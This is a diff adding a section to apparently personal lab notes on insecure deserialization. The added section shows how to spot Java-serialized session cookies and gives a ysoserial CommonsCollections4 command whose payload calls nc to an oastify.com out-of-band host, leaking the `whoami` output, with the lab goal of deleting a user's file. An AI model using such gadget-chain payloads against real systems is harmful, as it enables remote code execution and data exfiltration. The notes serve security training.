@@ -35,3 +35,12 @@ source code -> hidden page by add `~` EoF -> login -> change the cookies with se
 **Penjelasan** :
 since on hidden page there's a magic method `__construct` and `__destruct`, you could abuse the method. 
 
+### Exploiting Java deserialization with Apache Commons
+**Objection**: delete file morale.txt from Carlos's home directory
+**Payload** :
+login -> see on cookie that the session start with 'rO0ABX', it means using java deserialization -> using ysoserial with command
+```bash
+java -jar ysoserial-all.jar CommonsCollections4 'nc `whoami`.4ej91z9o7ej3zcfc3u2kxuvsqjwak28r.oastify.com' | base64 -w 0
+```
+
+
